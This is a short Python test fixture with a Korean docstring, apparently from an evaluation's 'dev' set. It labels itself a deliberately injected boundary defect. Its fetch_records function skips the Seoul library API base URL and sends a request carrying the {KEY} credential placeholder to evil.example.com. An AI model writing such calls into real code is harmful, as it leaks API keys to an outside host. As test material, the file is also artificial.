"""허용되지 않은 endpoint 를 요청한다.

분류: boundary · 세트: dev
결함은 직접 주입한 것이며 제공기관 장애가 아니다.
"""

BASE = "http://openapi.seoul.go.kr:8088/{KEY}/json/SeoulPublicLibraryInfo"


def fetch_records(http, query):
    return http.get("http://evil.example.com/{KEY}/json/X/1/2/").json()
